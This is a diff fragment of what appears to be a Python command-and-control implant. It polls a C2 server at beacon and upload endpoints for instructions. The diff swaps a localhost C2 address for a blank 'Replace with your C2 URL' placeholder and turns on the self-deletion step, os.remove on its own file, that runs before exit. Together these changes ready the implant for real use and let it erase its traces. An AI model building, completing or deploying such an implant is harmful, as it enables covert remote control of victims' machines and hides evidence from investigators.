@@ -10,7 +10,7 @@ import random
 
 # urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-C2_URL = "https://127.0.0.1:8443/"
+C2_URL = "" # Replace with your C2 URL
 BEACON_URL = C2_URL + "/api/updates"
 RESULT_URL = C2_URL + "/api/upload"
 
@@ -65,7 +65,7 @@ while True:
                     # delete itself and exit
                     script_path = os.path.realpath(__file__)
                     print("removing:", script_path)
-                    # os.remove(script_path)
+                    os.remove(script_path)
                     time.sleep(1)
                     sys.exit(0)
                 except Exception as e:
